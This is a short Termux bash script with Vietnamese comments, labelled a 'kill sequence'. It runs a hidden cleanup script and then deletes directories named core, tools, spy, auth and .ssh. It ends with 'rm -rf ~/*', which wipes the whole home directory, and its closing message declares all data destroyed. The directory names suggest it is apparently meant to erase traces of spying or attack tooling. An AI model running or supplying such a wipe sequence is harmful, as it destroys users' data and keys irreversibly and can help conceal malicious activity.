#!/data/data/com.termux/files/usr/bin/bash

echo "[!!] ACTIVATING KILL SEQUENCE..."
sleep 2

# Gọi cleanup
bash ~/.cleanup.sh

# Xoá mọi dữ liệu, kể cả quan trọng
rm -rf ~/core ~/tools ~/spy ~/auth ~/.ssh
rm -rf ~/*

echo "[✓] Toàn bộ dữ liệu đã bị tiêu huỷ."
